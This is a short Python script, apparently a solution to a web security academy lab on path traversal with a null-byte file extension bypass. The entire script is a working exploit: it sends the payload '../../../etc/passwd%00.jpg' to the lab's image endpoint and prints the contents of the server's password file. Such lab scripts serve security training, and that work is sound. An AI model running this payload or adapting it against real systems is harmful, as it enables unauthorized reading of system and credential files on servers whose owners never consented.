# Vulnerability :- Path Traversal
# Lab Name :- File path traversal, validation of file extension with null byte bypass

import requests

url = "https://0a8c0061041587308040627000ef0093.web-security-academy.net" # Change me without trailing slashes

def i_am_attacking():
    payload = "../../../etc/passwd%00.jpg"
    url_with_payload = f"{url}/image?filename={payload}"
    response = requests.get(url_with_payload)
    print()
    print(response.text)
i_am_attacking()